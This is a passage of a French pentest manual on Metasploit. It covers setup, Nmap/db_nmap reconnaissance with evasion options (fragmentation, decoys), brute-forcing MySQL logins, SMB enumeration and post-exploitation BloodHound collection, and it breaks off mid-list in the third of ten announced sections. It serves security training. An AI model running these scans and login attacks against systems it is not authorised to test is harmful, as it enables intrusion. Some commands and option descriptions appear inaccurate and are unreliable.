# Manuel méthodologique : Metasploit Framework et outils complémentaires

## Table des matières

1. [Pré-requis & mise en place](#pré-requis--mise-en-place)
2. [Reconnaissance réseau avec Nmap + db_nmap](#reconnaissance-réseau-avec-nmap--db_nmap)
3. [Analyse des résultats](#analyse-des-résultats)
4. [Recherche d'exploits avec searchsploit & Metasploit](#recherche-dexploits-avec-searchsploit--metasploit)
5. [Sélection & exécution d'exploits](#sélection--exécution-dexploits)
6. [Post-exploitation & modules auxiliaires](#post-exploitation--modules-auxiliaires)
7. [Gestion des workspaces, logs & reporting](#gestion-des-workspaces-logs--reporting)
8. [Étude de cas guidée](#étude-de-cas-guidée--pentest-dun-réseau-interne)
9. [Pièges fréquents & bonnes pratiques](#pièges-fréquents--bonnes-pratiques)
10. [Glossaire final](#glossaire-final)

# Pré-requis & mise en place

## Introduction à l'environnement de pentest

L'utilisation efficace du Metasploit Framework nécessite une préparation minutieuse de l'environnement de travail. Cette section détaille les prérequis techniques et la configuration initiale pour garantir une expérience optimale lors de vos tests d'intrusion.

### Pourquoi une bonne préparation est essentielle

> **POURQUOI ?**  
> Un environnement correctement configuré permet d'éviter les problèmes techniques en cours de mission, d'assurer la traçabilité des actions et de maximiser l'efficacité des tests. La préparation est souvent la clé d'un pentest réussi.

## Configuration système recommandée

Pour exécuter Metasploit Framework et les outils associés de manière optimale, votre système devrait disposer des caractéristiques suivantes :

- Processeur : Quad-core (minimum)
- RAM : 8 Go (minimum), 16 Go (recommandé)
- Espace disque : 50 Go minimum (pour les outils, bases de données et résultats)
- Système d'exploitation : Kali Linux (recommandé), ParrotOS, BlackArch ou Ubuntu avec outils de sécurité

> **COMMENT ?**  
> Privilégiez une machine virtuelle dédiée pour vos tests d'intrusion. Cela permet d'isoler votre environnement de test et de créer des snapshots avant chaque mission importante.

## Installation de Metasploit Framework

### Sur Kali Linux (préinstallé)

Metasploit est préinstallé sur Kali Linux, mais il est recommandé de le mettre à jour :

```bash
sudo apt update
sudo apt upgrade -y
sudo apt install metasploit-framework -y
```

### Sur Ubuntu ou autres distributions Linux

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
sudo ./msfinstall
```

### Vérification de l'installation

```bash
msfconsole -v
```

Exemple de sortie :
```
Framework Version: 6.3.27-dev
Installed at: /usr/share/metasploit-framework
Ruby version: 3.0.5-p223
```

## Configuration de la base de données PostgreSQL

Metasploit utilise PostgreSQL pour stocker les informations de reconnaissance, les résultats de scan et les données de session.

### Installation et configuration

```bash
sudo systemctl start postgresql
sudo systemctl enable postgresql
sudo msfdb init
```

Exemple de sortie :
```
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
```

### Vérification de la connexion à la base de données

Lancez msfconsole et vérifiez la connexion :

```bash
msfconsole
msf6 > db_status
```

Exemple de sortie :
```
[*] Connected to msf. Connection type: postgresql.
```

| Commande | Description | Options importantes |
|----------|-------------|---------------------|
| `msfdb init` | Initialise la base de données | `--component` pour spécifier un composant |
| `msfdb reinit` | Réinitialise la base de données | `--delete-existing-data` pour supprimer les données existantes |
| `msfdb delete` | Supprime la base de données | - |
| `msfdb status` | Vérifie l'état de la base de données | - |

## Installation des outils complémentaires essentiels

### Searchsploit (Exploit-DB)

Searchsploit est un outil de recherche d'exploits dans la base de données Exploit-DB.

```bash
sudo apt update
sudo apt install exploitdb -y
searchsploit -u  # Met à jour la base de données
```

### Scripts NSE de Nmap

Les scripts NSE (Nmap Scripting Engine) sont essentiels pour la détection de vulnérabilités.

```bash
sudo apt install nmap -y
# Mise à jour des scripts NSE
sudo nmap --script-updatedb
```

### Outils additionnels recommandés

```bash
# Outils d'énumération et d'exploitation
sudo apt install -y enum4linux nbtscan smbclient hydra john

# Outils d'analyse de vulnérabilités
sudo apt install -y nikto wpscan

# Outils de capture et d'analyse réseau
sudo apt install -y wireshark tcpdump
```

## Configuration de l'environnement de travail

### Structure de répertoires recommandée

Créez une structure de répertoires organisée pour vos projets de pentest :

```bash
mkdir -p ~/pentest/{scans,exploits,loot,reports,tools}
```

### Configuration de l'environnement Metasploit

Créez un fichier de configuration personnalisé pour Metasploit :

```bash
cat > ~/.msf4/msfconsole.rc << EOF
spool ~/pentest/logs/msf_\$(date +%Y%m%d).log
setg LHOST $(hostname -I | awk '{print $1}')
setg VERBOSE true
EOF
```

> **COMMENT ?**  
> Le fichier msfconsole.rc est chargé automatiquement au démarrage de msfconsole. Il permet de définir des paramètres par défaut et d'exécuter des commandes au démarrage.

### Préparation d'un environnement isolé pour les tests

Pour les tests d'exploitation, il est recommandé d'utiliser des machines virtuelles vulnérables :

- Metasploitable 2/3 : Environnements Linux volontairement vulnérables
- DVWA (Damn Vulnerable Web Application) : Application web vulnérable
- VulnHub : Collection de machines virtuelles vulnérables

```bash
# Exemple de téléchargement de Metasploitable 2
mkdir -p ~/pentest/targets
cd ~/pentest/targets
wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip
unzip metasploitable-linux-2.0.0.zip
```

## Premiers pas avec Metasploit Framework

### Lancement et interface de base

```bash
msfconsole
```

Commandes de base à connaître :

```
msf6 > help
msf6 > version
msf6 > banner
```

### Création d'un espace de travail

Les workspaces permettent d'organiser vos tests par projet ou par cible :

```
msf6 > workspace -h
msf6 > workspace -a mon_premier_projet
msf6 > workspace
```

Exemple de sortie :
```
* default
  mon_premier_projet
```

| Commande | Description | Options importantes |
|----------|-------------|---------------------|
| `workspace -a [nom]` | Crée un nouvel espace de travail | - |
| `workspace -d [nom]` | Supprime un espace de travail | - |
| `workspace -r [ancien] [nouveau]` | Renomme un espace de travail | - |
| `workspace [nom]` | Change d'espace de travail | - |

## Intégration avec d'autres outils de sécurité

### Nessus

Nessus est un scanner de vulnérabilités professionnel qui s'intègre bien avec Metasploit.

Installation (version Essentials gratuite) :
```bash
# Téléchargement depuis le site officiel
cd ~/Downloads
wget https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.5.0-debian10_amd64.deb
sudo dpkg -i Nessus-10.5.0-debian10_amd64.deb
sudo systemctl start nessusd
```

Accédez à l'interface web via https://localhost:8834 pour terminer la configuration.

> **POURQUOI ?**  
> Nessus offre des scans de vulnérabilités plus approfondis que les modules Metasploit seuls. L'intégration permet d'importer directement les résultats de scan dans Metasploit pour exploitation.

### OpenVAS

Alternative open source à Nessus :

```bash
sudo apt install openvas -y
sudo gvm-setup
sudo gvm-start
```

Accédez à l'interface web via https://localhost:9392 (utilisateur : admin).

### CrackMapExec

Outil puissant pour l'énumération et l'exploitation de réseaux Windows :

```bash
sudo apt install crackmapexec -y
# ou via pip
sudo pip3 install crackmapexec
```

Exemple d'utilisation basique :
```bash
crackmapexec smb 192.168.1.0/24
```

### Impacket

Suite d'outils Python pour travailler avec les protocoles réseau Microsoft :

```bash
sudo apt install python3-impacket -y
# ou via pip
sudo pip3 install impacket
```

## En résumé

La préparation de l'environnement de pentest est une étape cruciale qui conditionne l'efficacité de vos tests d'intrusion. Un environnement bien configuré avec Metasploit Framework, sa base de données PostgreSQL et les outils complémentaires vous permettra de mener des tests structurés et reproductibles.

Points clés à retenir :
- Utilisez une distribution Linux dédiée à la sécurité comme Kali Linux
- Configurez correctement la base de données PostgreSQL pour Metasploit
- Installez et maintenez à jour les outils complémentaires (Searchsploit, scripts NSE, etc.)
- Organisez votre environnement de travail avec une structure de répertoires claire
- Utilisez les workspaces Metasploit pour séparer vos différents projets
- Intégrez des outils spécialisés comme Nessus ou CrackMapExec pour enrichir vos capacités

Dans la section suivante, nous aborderons la reconnaissance réseau avec Nmap et db_nmap, première étape concrète de tout test d'intrusion.
# Reconnaissance réseau avec Nmap + db_nmap

## Introduction à la phase de reconnaissance

La reconnaissance réseau constitue la première étape technique de tout test d'intrusion. Cette phase permet d'identifier les systèmes actifs, les services exposés et les potentielles vulnérabilités présentes sur le réseau cible.

### Pourquoi la reconnaissance est cruciale

> **POURQUOI ?**  
> Une reconnaissance approfondie permet d'établir une cartographie précise de la surface d'attaque. Plus cette cartographie est détaillée, plus les phases suivantes du pentest seront efficaces. Une reconnaissance incomplète peut faire manquer des vecteurs d'attaque critiques.

## Nmap : l'outil de référence

Nmap (Network Mapper) est l'outil de référence pour la reconnaissance réseau. Son intégration avec Metasploit via db_nmap permet d'automatiser le processus de collecte et d'analyse des informations.

### Principes fondamentaux de Nmap

Nmap fonctionne en envoyant des paquets spécifiquement formatés aux cibles et en analysant les réponses pour déterminer :
- L'état des hôtes (actifs/inactifs)
- Les ports ouverts, fermés ou filtrés
- Les services et leurs versions
- Les systèmes d'exploitation
- Les caractéristiques réseau

### Commandes Nmap de base

```bash
# Scan simple d'un hôte
nmap 192.168.1.1

# Scan d'un réseau entier
nmap 192.168.1.0/24

# Scan des 1000 ports les plus courants
nmap -F 192.168.1.0/24
```

Exemple de sortie :
```
Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-27 14:30 CEST
Nmap scan report for 192.168.1.1
Host is up (0.0023s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
445/tcp open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
```

## Intégration de Nmap avec Metasploit via db_nmap

### Avantages de db_nmap

> **POURQUOI ?**  
> L'utilisation de db_nmap permet de stocker automatiquement les résultats des scans dans la base de données PostgreSQL de Metasploit. Cela facilite l'analyse ultérieure, la corrélation des données et l'automatisation des attaques.

### Vérification de la connexion à la base de données

Avant d'utiliser db_nmap, assurez-vous que Metasploit est bien connecté à sa base de données :

```
msf6 > db_status
```

Si la connexion n'est pas établie, initialisez-la :

```
msf6 > exit
$ sudo msfdb init
$ msfconsole
msf6 > db_status
```

### Utilisation de base de db_nmap

```
msf6 > workspace -a projet_client_xyz
msf6 > db_nmap -sV 192.168.1.0/24
```

Exemple de sortie :
```
[*] Nmap: Starting Nmap 7.93 ( https://nmap.org )
[*] Nmap: Nmap scan report for 192.168.1.1
[*] Nmap: Host is up (0.0023s latency).
[*] Nmap: Not shown: 995 closed tcp ports (conn-refused)
[*] Nmap: PORT    STATE SERVICE  VERSION
[*] Nmap: 22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
[*] Nmap: 80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
[*] Nmap: 443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
[*] Nmap: 445/tcp open  smb      Samba smbd 4.6.2
[*] Nmap: 3389/tcp open  rdp     xrdp
[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Stratégies de scan avancées

### Scan en plusieurs phases

Pour une reconnaissance efficace, adoptez une approche en plusieurs phases :

1. **Découverte des hôtes actifs** (scan rapide)
2. **Scan de ports** (identification des services)
3. **Détection de version** (identification précise des logiciels)
4. **Scan de vulnérabilités** (scripts NSE)

### Phase 1 : Découverte des hôtes actifs

```
msf6 > db_nmap -sn 192.168.1.0/24
```

Cette commande effectue un "ping scan" pour identifier rapidement les hôtes actifs sans scanner les ports.

### Phase 2 : Scan de ports

```
msf6 > db_nmap -sS -p- --min-rate 1000 192.168.1.100
```

| Option | Description |
|--------|-------------|
| `-sS` | Scan SYN (semi-ouvert) |
| `-p-` | Tous les ports (1-65535) |
| `--min-rate` | Nombre minimum de paquets par seconde |

> **COMMENT ?**  
> Le scan SYN est plus discret qu'un scan TCP complet car il n'établit pas de connexion complète. Il est également plus rapide. L'option `--min-rate` permet d'accélérer le scan, mais peut générer plus de bruit réseau.

### Phase 3 : Détection de version

```
msf6 > db_nmap -sV -p 22,80,443,445,3389 192.168.1.100
```

| Option | Description |
|--------|-------------|
| `-sV` | Détection de version |
| `-p` | Ports spécifiques à scanner |
| `-A` | Active la détection de système d'exploitation, de version, le script scanning et le traceroute |

### Phase 4 : Scan de vulnérabilités avec scripts NSE

```
msf6 > db_nmap --script vuln -p 80,443,445 192.168.1.100
```

Exemple de sortie avec vulnérabilités détectées :
```
[*] Nmap: PORT    STATE SERVICE
[*] Nmap: 445/tcp open  microsoft-ds
[*] Nmap: |_smb-vuln-ms17-010: VULNERABLE: Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
[*] Nmap: | smb-vuln-ms08-067:
[*] Nmap: |   VULNERABLE:
[*] Nmap: |   Microsoft Windows system vulnerable to remote code execution (MS08-067)
[*] Nmap: |     State: VULNERABLE
```

## Catégories de scripts NSE essentiels pour le pentest

Les scripts NSE (Nmap Scripting Engine) sont regroupés par catégories. Voici les plus utiles pour le pentest :

| Catégorie | Description | Exemple d'utilisation |
|-----------|-------------|------------------------|
| `vuln` | Détection de vulnérabilités connues | `--script vuln` |
| `exploit` | Exploitation de vulnérabilités | `--script smb-vuln-ms17-010` |
| `auth` | Authentification et contournement | `--script http-auth` |
| `brute` | Attaques par force brute | `--script ssh-brute` |
| `discovery` | Découverte d'informations | `--script http-enum` |
| `safe` | Scripts non intrusifs | `--script safe` |

### Scripts NSE spécifiques recommandés

```
# Énumération SMB
msf6 > db_nmap --script smb-enum-shares,smb-enum-users -p 445 192.168.1.100

# Détection de vulnérabilités web
msf6 > db_nmap --script http-vuln* -p 80,443 192.168.1.100

# Énumération des services SSL/TLS
msf6 > db_nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

> **POURQUOI ?**  
> Les scripts NSE permettent d'automatiser la détection de vulnérabilités spécifiques et d'enrichir considérablement les informations collectées lors de la phase de reconnaissance.

## Techniques avancées avec db_nmap

### Scan furtif et évitement de détection

```
msf6 > db_nmap -sS -T2 --data-length 24 --max-retries 1 192.168.1.100
```

| Option | Description |
|--------|-------------|
| `-T2` | Timing template (0-5, 0 étant le plus lent) |
| `--data-length` | Ajoute des données aléatoires aux paquets |
| `--max-retries` | Nombre maximum de retransmissions |

### Scan avec fragmentation de paquets

```
msf6 > db_nmap -f -sS 192.168.1.100
```

L'option `-f` fragmente les paquets IP pour contourner certains pare-feu.

### Utilisation de leurres

```
msf6 > db_nmap -D 10.0.0.1,10.0.0.2,ME 192.168.1.100
```

L'option `-D` génère du trafic de leurre depuis des adresses IP spécifiées (ME représente votre propre IP).

## Automatisation des scans avec des scripts personnalisés

### Création d'un script de reconnaissance automatisé

Créez un fichier `recon.rc` dans votre répertoire de travail :

```
# Contenu du fichier recon.rc
workspace -a %TARGET%
db_nmap -sn %RANGE%
hosts -R
db_nmap -sS -sV -O --script default,vuln -p- -iL /tmp/msf-hosts.txt
services
vulns
```

Utilisation du script :

```
msf6 > setg TARGET client_xyz
msf6 > setg RANGE 192.168.1.0/24
msf6 > resource recon.rc
```

> **COMMENT ?**  
> Les scripts resource (.rc) permettent d'automatiser des séquences de commandes dans Metasploit. Ils sont particulièrement utiles pour standardiser les processus de reconnaissance et garantir l'exhaustivité des scans.

## Bonnes pratiques pour la reconnaissance réseau

### Optimisation des scans

- Commencez par des scans légers avant de passer aux scans intensifs
- Ciblez d'abord les ports et services les plus courants
- Adaptez la vitesse de scan en fonction de la stabilité du réseau
- Utilisez des options comme `--min-rate` et `--max-retries` pour équilibrer vitesse et fiabilité

### Documentation et organisation

- Utilisez systématiquement les workspaces pour séparer vos projets
- Annotez les hôtes et services importants
- Exportez régulièrement vos résultats

```
msf6 > hosts -c address,os_name,purpose -o /home/kali/pentest/hosts.csv
msf6 > services -c port,proto,name,info -o /home/kali/pentest/services.csv
```

### Considérations légales et éthiques

- Assurez-vous d'avoir les autorisations nécessaires avant tout scan
- Évitez les scans trop agressifs qui pourraient perturber les services
- Documentez vos actions pour pouvoir justifier votre méthodologie

## Intégration avec d'autres outils de reconnaissance

### AutoRecon

AutoRecon est un outil multi-threaded qui automatise la phase de reconnaissance en exécutant plusieurs outils en parallèle.

Installation :
```bash
git clone https://github.com/Tib3rius/AutoRecon.git
cd AutoRecon
pip3 install -r requirements.txt
```

Utilisation et intégration avec Metasploit :
```bash
python3 autorecon.py 192.168.1.0/24 --output=/home/kali/pentest/autorecon
# Importation des résultats dans Metasploit
msf6 > db_import /home/kali/pentest/autorecon/192.168.1.100/xml/nmap-*.xml
```

### Masscan

Masscan est l'un des scanners de ports les plus rapides, idéal pour les grands réseaux.

Installation :
```bash
sudo apt install masscan -y
```

Utilisation et intégration avec Metasploit :
```bash
sudo masscan -p1-65535 192.168.1.0/24 --rate=10000 -oX masscan.xml
# Conversion au format Nmap pour importation
xsltproc -o masscan_nmap.xml /usr/share/masscan/masscan2nmap.xsl masscan.xml
# Importation dans Metasploit
msf6 > db_import masscan_nmap.xml
```

> **POURQUOI ?**  
> Masscan peut scanner l'internet entier en moins d'une heure. Il est particulièrement utile pour les scans initiaux sur de grands réseaux, avant d'utiliser Nmap pour des analyses plus détaillées.

## En résumé

La reconnaissance réseau avec Nmap et db_nmap constitue le fondement de tout test d'intrusion réussi. L'intégration de ces outils avec Metasploit permet d'optimiser le workflow en stockant automatiquement les résultats dans une base de données structurée.

Points clés à retenir :
- Adoptez une approche de scan en plusieurs phases (découverte, ports, versions, vulnérabilités)
- Utilisez systématiquement db_nmap pour alimenter la base de données Metasploit
- Exploitez les scripts NSE pour la détection automatisée de vulnérabilités
- Adaptez vos techniques de scan en fonction du contexte (furtivité, exhaustivité)
- Automatisez vos processus de reconnaissance avec des scripts resource
- Intégrez d'autres outils spécialisés comme Masscan ou AutoRecon pour des cas d'usage spécifiques

Dans la section suivante, nous verrons comment analyser efficacement les résultats de reconnaissance stockés dans la base de données Metasploit.
# Analyse des résultats

## Introduction à l'analyse des données de reconnaissance

Une fois la phase de reconnaissance terminée, l'analyse méthodique des résultats devient cruciale pour identifier les vecteurs d'attaque potentiels. Metasploit offre plusieurs commandes puissantes pour explorer et manipuler les données collectées dans sa base de données.

### Pourquoi une analyse structurée est essentielle

> **POURQUOI ?**  
> L'analyse structurée des résultats de reconnaissance permet d'identifier rapidement les cibles prioritaires, de repérer les vulnérabilités exploitables et d'optimiser le temps consacré à la phase d'exploitation. Sans cette étape, vous risquez de passer à côté d'opportunités ou de perdre du temps sur des cibles peu prometteuses.

## Navigation dans la base de données Metasploit

### Commande `hosts` : Gestion des hôtes découverts

La commande `hosts` permet de visualiser et de manipuler les informations sur les hôtes découverts lors des scans.

```
msf6 > hosts -h
```

Exemple d'utilisation basique :
```
msf6 > hosts

Hosts
=====

address        mac                name         os_name     os_flavor  os_sp  purpose  info  comments
-------        ---                ----         -------     ---------  -----  -------  ----  --------
192.168.1.1    00:11:22:33:44:55  router.lan   Linux       Ubuntu     20.04  server         Gateway
192.168.1.100  AA:BB:CC:DD:EE:FF  server1.lan  Windows     Server     2019   server         File server
192.168.1.101  FF:EE:DD:CC:BB:AA  client1.lan  Windows     10         Pro    client         HR department
```

Options utiles pour la commande `hosts` :

| Option | Description | Exemple |
|--------|-------------|---------|
| `-S` | Recherche par critères | `hosts -S Windows` |
| `-c` | Colonnes à afficher | `hosts -c address,os_name` |
| `-o` | Exporter vers un fichier | `hosts -o /tmp/hosts.csv` |
| `-d` | Supprimer des hôtes | `hosts -d 192.168.1.101` |
| `-R` | Ajouter les hôtes à la liste de cibles | `hosts -R` |

> **COMMENT ?**  
> Utilisez l'option `-S` pour filtrer rapidement les hôtes par système d'exploitation, nom ou adresse. Cela vous permet de cibler vos attaques en fonction des vulnérabilités spécifiques à certains systèmes.

### Commande `services` : Analyse des services détectés

La commande `services` permet d'explorer les services détectés sur les hôtes cibles.

```
msf6 > services

Services
========

host           port  proto  name          state  info
----           ----  -----  ----          -----  ----
192.168.1.1    22    tcp    ssh           open   OpenSSH 8.2p1
192.168.1.1    80    tcp    http          open   Apache 2.4.41
192.168.1.100  445   tcp    microsoft-ds  open   Samba 4.3.11
192.168.1.100  3389  tcp    ms-wbt-server open   xrdp
192.168.1.101  139   tcp    netbios-ssn   open   Windows netbios
192.168.1.101  445   tcp    microsoft-ds  open   Windows Server 2019 microsoft-ds
```

Options utiles pour la commande `services` :

| Option | Description | Exemple |
|--------|-------------|---------|
| `-S` | Recherche par critères | `services -S http` |
| `-c` | Colonnes à afficher | `services -c port,name,info` |
| `-o` | Exporter vers un fichier | `services -o /tmp/services.csv` |
| `-p` | Filtrer par port | `services -p 445` |
| `-R` | Ajouter les services à la liste de cibles | `services -p 445 -R` |

Exemples d'utilisation avancée :

```
# Recherche de tous les services web
msf6 > services -S http,https

# Recherche de services SSH vulnérables (version dans le nom)
msf6 > services -S ssh -v

# Recherche de services sur un hôte spécifique
msf6 > services -h 192.168.1.100
```

### Commande `vulns` : Analyse des vulnérabilités détectées

La commande `vulns` affiche les vulnérabilités identifiées par les scripts NSE ou les modules auxiliaires.

```
msf6 > vulns

Vulnerabilities
==============

Timestamp                Host           Name                                  References
---------                ----           ----                                  ----------
2025-05-27 14:45:22 UTC  192.168.1.100  MS17-010 SMB RCE Detection            CVE-2017-0143,CVE-2017-0144,CVE-2017-0145,CVE-2017-0146,CVE-2017-0147,CVE-2017-0148
2025-05-27 14:46:15 UTC  192.168.1.101  SSL/TLS POODLE Information Leak       CVE-2014-3566
2025-05-27 14:47:30 UTC  192.168.1.1    Apache 2.4.41 mod_cgi Remote Command  CVE-2021-44790
```

Options utiles pour la commande `vulns` :

| Option | Description | Exemple |
|--------|-------------|---------|
| `-S` | Recherche par critères | `vulns -S SMB` |
| `-h` | Filtrer par hôte | `vulns -h 192.168.1.100` |
| `-o` | Exporter vers un fichier | `vulns -o /tmp/vulns.csv` |
| `-s` | Trier par colonne | `vulns -s name` |
| `-R` | Définir comme cibles | `vulns -S MS17-010 -R` |

> **POURQUOI ?**  
> La commande `vulns` est particulièrement précieuse car elle vous permet d'identifier rapidement les vulnérabilités critiques qui pourraient être exploitées. En combinaison avec l'option `-R`, vous pouvez directement définir ces systèmes vulnérables comme cibles pour vos modules d'exploitation.

### Commande `loot` : Gestion des données extraites

La commande `loot` permet de visualiser et de gérer les informations sensibles récupérées lors des phases d'exploitation.

```
msf6 > loot

Loot
====
host           service  type                 name                           content     info                               path
----           -------  ----                 ----                           -------     ----                               ----
192.168.1.100  smb      windows.hashes       smb_hashdump                   text/plain  Windows password hashes            /home/kali/.msf4/loot/20250527144812_default_192.168.1.100_windows.hashes_123456.txt
192.168.1.101  http     apache.config        apache_config                  text/plain  Apache configuration file          /home/kali/.msf4/loot/20250527145023_default_192.168.1.101_apache.config_234567.txt
192.168.1.1    ssh      unix.passwd          passwd                         text/plain  Linux /etc/passwd file             /home/kali/.msf4/loot/20250527145245_default_192.168.1.1_unix.passwd_345678.txt
```

Options utiles pour la commande `loot` :

| Option | Description | Exemple |
|--------|-------------|---------|
| `-t` | Filtrer par type | `loot -t windows.hashes` |
| `-h` | Filtrer par hôte | `loot -h 192.168.1.100` |
| `-S` | Recherche par contenu | `loot -S password` |
| `-d` | Supprimer une entrée | `loot -d 1` |
| `-i` | Afficher le contenu | `loot -i 1` |

## Techniques d'analyse avancées

### Corrélation des données avec les commandes combinées

La puissance de l'analyse dans Metasploit réside dans la capacité à combiner les différentes commandes pour identifier rapidement les cibles prioritaires.

```
# Identifier tous les hôtes Windows avec le service SMB ouvert
msf6 > hosts -S Windows
msf6 > services -h 192.168.1.100,192.168.1.101 -p 445

# Vérifier si ces hôtes ont des vulnérabilités connues
msf6 > vulns -h 192.168.1.100,192.168.1.101
```

### Utilisation des notes pour enrichir l'analyse

La commande `notes` permet de consulter les informations supplémentaires collectées lors des scans.

```
msf6 > notes

Notes
=====

host           type                                  data                                      time
----           ----                                  ----                                      ----
192.168.1.1    host.mac.address                      00:11:22:33:44:55                         2025-05-27 14:30:15 UTC
192.168.1.100  smb.fingerprint                       Windows Server 2019 Standard 17763        2025-05-27 14:32:22 UTC
192.168.1.101  web.application.framework             WordPress 5.8.1                           2025-05-27 14:35:45 UTC
```

### Ajout manuel de notes et d'informations

Vous pouvez enrichir votre base de données avec des informations supplémentaires :

```
# Ajouter une note à un hôte
msf6 > note -h 192.168.1.100 -t target.comments -d "Serveur critique - Accès prioritaire"

# Ajouter un hôte manuellement
msf6 > hosts -a 192.168.1.200 -O "Linux" -C "Serveur de backup"
```

## Visualisation et exportation des données

### Exportation des données pour analyse externe

Metasploit permet d'exporter facilement les données pour une analyse dans d'autres outils.

```
# Exporter les hôtes au format CSV
msf6 > hosts -o /home/kali/pentest/hosts.csv

# Exporter les services au format XML
msf6 > services -o /home/kali/pentest/services.xml -f xml

# Exporter les vulnérabilités au format JSON
msf6 > vulns -o /home/kali/pentest/vulns.json -f json
```

### Création de rapports personnalisés

```
# Créer un rapport de base
msf6 > db_export -f xml /home/kali/pentest/msf_report.xml

# Rapport plus détaillé avec l'extension Metasploit-Plugins
msf6 > load msgrpc
msf6 > load report
msf6 > report generate -f pdf -t pentest -o /home/kali/pentest/rapport_complet.pdf
```

> **COMMENT ?**  
> L'extension report n'est pas installée par défaut. Pour l'installer :
> ```
> mkdir -p ~/.msf4/plugins
> git clone https://github.com/darkoperator/Metasploit-Plugins.git
> cp Metasploit-Plugins/report.rb ~/.msf4/plugins/
> ```

## Analyse avec des outils externes

### Intégration avec EyeWitness

EyeWitness permet de prendre des captures d'écran automatiques des services web découverts.

Installation :
```bash
git clone https://github.com/FortyNorthSecurity/EyeWitness.git
cd EyeWitness/Python/setup
sudo ./setup.sh
```

Utilisation avec les données Metasploit :
```
# Exporter les services web
msf6 > services -S http,https -o /tmp/web_services.csv

# Utiliser EyeWitness pour capturer les interfaces
cd ~/EyeWitness/Python
./EyeWitness.py --web -f /tmp/web_services.csv -d /home/kali/pentest/screenshots --no-prompt
```

### Intégration avec Sparta/Legion

Legion (anciennement Sparta) est un outil de scan et d'énumération qui peut importer les résultats de Metasploit.

Installation :
```bash
sudo apt install legion -y
```

Exportez vos données Metasploit et importez-les dans Legion pour une analyse visuelle plus poussée.

## Techniques d'analyse spécifiques par type de service

### Analyse des services web (HTTP/HTTPS)

```
# Identifier tous les services web
msf6 > services -S http,https

# Utiliser Wappalyzer via Metasploit pour identifier les technologies
msf6 > use auxiliary/scanner/http/wappalyzer
msf6 auxiliary(scanner/http/wappalyzer) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/http/wappalyzer) > run
```

### Analyse des services Windows (SMB/RPC)

```
# Identifier les partages SMB accessibles
msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(scanner/smb/smb_enumshares) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_enumshares) > run

# Énumérer les utilisateurs
msf6 > use auxiliary/scanner/smb/smb_enumusers
msf6 auxiliary(scanner/smb/smb_enumusers) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_enumusers) > run
```

### Analyse des services de base de données

```
# Scanner MySQL
msf6 > use auxiliary/scanner/mysql/mysql_version
msf6 auxiliary(scanner/mysql/mysql_version) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/mysql/mysql_version) > run

# Tester les identifiants par défaut
msf6 > use auxiliary/scanner/mysql/mysql_login
msf6 auxiliary(scanner/mysql/mysql_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/mysql/mysql_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf6 auxiliary(scanner/mysql/mysql_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
msf6 auxiliary(scanner/mysql/mysql_login) > run
```

## Automatisation de l'analyse avec des scripts resource

### Création d'un script d'analyse automatisé

Créez un fichier `analyze.rc` dans votre répertoire de travail :

```
# Contenu du fichier analyze.rc
use auxiliary/scanner/smb/smb_version
services -p 445 -R
run
use auxiliary/scanner/smb/smb_enumshares
services -p 445 -R
run
use auxiliary/scanner/http/http_version
services -p 80,443 -R
run
vulns
services -v
```

Utilisation du script :

```
msf6 > resource analyze.rc
```

> **POURQUOI ?**  
> Les scripts resource permettent d'automatiser des séquences d'analyse répétitives, garantissant ainsi l'exhaustivité de votre analyse tout en économisant du temps.

## Priorisation des cibles

### Matrice de priorisation

Après l'analyse des résultats, établissez une matrice de priorisation des cibles basée sur :

1. **Criticité des vulnérabilités** (CVSS)
2. **Importance des systèmes** (rôle dans l'infrastructure)
3. **Facilité d'exploitation** (existence d'exploits fiables)
4. **Impact potentiel** (accès aux données sensibles)

Exemple de commande pour identifier les cibles prioritaires :

```
# Rechercher les vulnérabilités avec un score CVSS élevé
msf6 > vulns -S "CVSS: 9"

# Identifier les serveurs critiques
msf6 > hosts -S "purpose:server"

# Combiner ces informations pour la priorisation
msf6 > vulns -h 192.168.1.100,192.168.1.101 -S "CVSS: [7-10]"
```

## Intégration avec BloodHound pour l'analyse Active Directory

BloodHound est un outil puissant pour visualiser et analyser les relations dans un environnement Active Directory.

Installation :
```bash
sudo apt install bloodhound -y
sudo neo4j console &
# Dans un autre terminal
bloodhound &
```

Collecte de données avec SharpHound :
```
# Depuis un système Windows compromis
msf6 > use post/windows/gather/bloodhound
msf6 post(windows/gather/bloodhound) > set SESSION 1
msf6 post(windows/gather/bloodhound) > run
```

> **COMMENT ?**  
> Une fois les données collectées, importez-les dans BloodHound pour visualiser les chemins d'attaque potentiels dans l'environnement Active Directory. Cela vous aidera à identifier les utilisateurs et systèmes à cibler en priorité.

## En résumé

L'analyse des résultats de reconnaissance est une étape cruciale qui fait le lien entre la découverte et l'exploitation. Metasploit offre un ensemble complet d'outils pour explorer, filtrer et corréler les données collectées.

Points clés à retenir :
- Utilisez les commandes `hosts`, `services`, `vulns` et `loot` pour naviguer dans les données collectées
